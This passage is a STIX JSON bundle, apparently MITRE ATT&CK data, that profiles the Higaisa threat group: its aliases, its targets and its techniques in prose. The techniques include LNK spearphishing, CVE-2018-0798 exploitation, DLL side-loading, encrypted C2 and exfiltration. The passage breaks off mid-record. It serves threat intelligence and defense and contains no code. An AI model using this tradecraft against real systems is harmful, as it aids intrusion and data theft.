{
    "type": "bundle",
    "id": "bundle--ad546234-1552-4256-a499-0267bdcbc7dc",
    "spec_version": "2.0",
    "objects": [
        {   "primary_motivation": "organizational-gain",
            "first_seen":"2007",
            "x_MISP-description": "The organization often uses important North Korean time nodes such as holidays and North Korea to conduct fishing activities. The bait includes New Year blessings, Lantern blessings, North Korean celebrations, and important news, overseas personnel contact lists and so on. In addition, the attack organization also has the attack capability of the mobile terminal. The targets of the attack also include diplomatic entities related to North Korea (such as embassy officials in various places), government officials, human rights organizations, North Korean residents abroad, and traders. The victim countries currently monitored include China, North Korea, Japan, Nepal, Singapore, Russia, Poland, Switzerland, etc.",
            "x_MISP-uuid": "a9df6cb7-74ff-482f-b23b-ac40e975a31a",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "intrusion-set",
            "name": "Higaisa",
            "x_mitre_version": "1.0",
            "modified": "2022-06-11T20:10:32.917Z",
            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
            "aliases": [
                "Higaisa",
                "DarkHotel",
                "APT-C-06",
                "SIG25",
                "Dubnium",
                "Fallout Team",
                "Shadow Crane",
                "CTG-1948",
                "Tungsten Bridge",
                "ATK 52",
                "T-APT-02",
                "Luder"
            ],
            "id": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) is a threat group suspected to have South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. [Higaisa](https://attack.mitre.org/groups/G0126) was first disclosed in early 2019 but is assessed to have operated as early as 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
            "x_mitre_contributors": [
                "Daniyal Naeem, BT Security"
            ],
            "created": "2021-03-05T18:54:56.267Z",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/groups/G0126",
                    "external_id": "G0126",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                },
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4ff8a2ad-2e69-4933-a5f4-201c891eef87",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used malicious e-mail attachments to lure victims into executing LNK files.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
            "modified": "2021-03-05T18:54:56.767Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.767Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--5fa551a6-dc9f-4ca5-a5ec-a393515cb618",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) dropped and added <code>officeupdate.exe</code> to scheduled tasks.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "modified": "2021-03-05T18:54:56.762Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.762Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--6eac5e98-29dd-4dae-8375-b459b87f28c8",
            "description": "(Citation: Malwarebytes Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
            "modified": "2021-03-30T20:16:51.220Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-30T20:16:51.220Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--7b053a36-de7d-476b-bc06-6d712432d615",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) has exploited CVE-2018-0798 for execution.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
            "modified": "2021-03-30T20:26:53.811Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.647Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--8ef60c8b-f178-4b78-b5c4-76747e075d84",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used JavaScript to execute additional files.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
            "modified": "2021-03-05T18:54:56.733Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.733Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                },
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--9dc630a6-a6fd-4173-8236-9bbb1041f7ea",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used an XSL file to run VBScript code.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
            "modified": "2021-03-05T18:54:56.641Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.641Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--40b904c6-d77d-4ba8-98a5-c03d5c2a3186",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126)\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the <code>OINFO12.OCX</code> dynamic link library.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "modified": "2021-03-08T18:27:58.793Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.793Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--49a11d2f-7945-4603-b409-d66420b94533",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) discovered system proxy settings and used them if available.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
            "modified": "2021-04-22T02:12:44.196Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.560Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--63dec489-68ad-46c2-9972-55394ad7601a",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) collected the system volume serial number, GUID, and computer name.(Citation: PTSecurity Higaisa 2020)(Citation: Malwarebytes Higaisa 2020)",
            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "modified": "2021-03-30T20:16:51.191Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.657Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                },
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--71db51a2-9968-408c-91b3-8f42a61d0b09",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used HTTP and HTTPS to send data back to its C2 server.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "modified": "2021-03-05T18:54:56.555Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.555Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--74fe4149-c5df-43a3-809a-5ece230b1cd7",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used a FakeTLS session for C2 communications.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
            "modified": "2021-03-30T20:00:52.565Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.548Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--382ab873-523f-4455-b3c5-74d81b4fc57b",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) exfiltrated data over its C2 channel.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d",
            "modified": "2021-03-05T18:54:56.525Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.525Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--853f320a-e611-4a23-9784-e0054f74b9e3",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
            "modified": "2021-03-08T18:27:58.695Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.695Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--0884b8fd-64b4-4736-b52d-0182d312b9bf",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) has used VBScript code on the victim's machine.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
            "modified": "2021-03-30T20:00:52.489Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-30T20:00:52.489Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--971d0828-7244-4278-adc5-dc480d57ba5b",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) performed padding with null bytes before calculating its hash.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5",
            "modified": "2021-03-05T18:54:56.463Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.463Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4032bd86-db32-4270-98a4-670be6992802",
            "description": "(Citation: Malwarebytes Higaisa 2020)",
            "target_ref": "malware--64fa0de0-6240-41f4-8638-f4ca7ed528fd",
            "modified": "2021-03-05T18:54:56.771Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.771Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4113afe0-e84a-44ba-9180-3033de06d72e",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used a function to gather the current time.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
            "modified": "2021-03-05T18:54:56.753Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.753Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--54784a8e-d827-4761-87ce-68ed55cc25f9",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used Base64 encoded compressed payloads.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "modified": "2021-03-05T18:54:56.634Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.634Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--645949a0-21a3-4c31-846d-33c2055d8bfd",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) has sent spearphishing emails containing malicious attachments.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) ",
            "target_ref": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
            "modified": "2021-04-05T16:35:25.523Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.756Z",
            "external_references": [
                {
                    "url": "https://blog.malwarebytes.com/threat-analysis/2020/06/higaisa/",
                    "description": "Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021.",
                    "source_name": "Malwarebytes Higaisa 2020"
                },
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--1489621a-59eb-42a9-b529-adc37c65520c",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) has called various native OS APIs.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
            "modified": "2021-03-08T18:27:58.799Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.799Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--a195cd11-43dc-4ad8-a48d-a1c705bb8b90",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used a payload that creates a hidden window.(Citation: PTSecurity Higaisa 2020)",
            "target_ref": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "modified": "2021-03-08T18:27:58.782Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.782Z",
            "external_references": [
                {
                    "url": "https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/covid-19-and-new-year-greetings-the-higaisa-group/",
                    "description": "PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.",
                    "source_name": "PTSecurity Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--af052dd3-641e-4954-a08f-74d56ad29b53",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) used AES-128 to encrypt C2 traffic.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
            "modified": "2021-03-05T18:54:56.544Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-05T18:54:56.544Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--c6c5a455-14da-4d6f-8149-c0dc3bbd6f56",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126)\u2019s shellcode attempted to find the process ID of the current process.(Citation: Zscaler Higaisa 2020)",
            "target_ref": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
            "modified": "2021-03-08T18:27:58.744Z",
            "source_ref": "intrusion-set--54dfec3e-6464-4f74-9d69-b7c817b7e5a3",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-03-08T18:27:58.744Z",
            "external_references": [
                {
                    "url": "https://www.zscaler.com/blogs/security-research/return-higaisa-apt",
                    "description": "Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021.",
                    "source_name": "Zscaler Higaisa 2020"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--c0792868-a5da-4486-9b3b-cefbc2667e54",
            "description": "[Higaisa](https://attack.mitre.org/groups/G0126) added a spoofed binary to the start-up folder for persistence.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)",
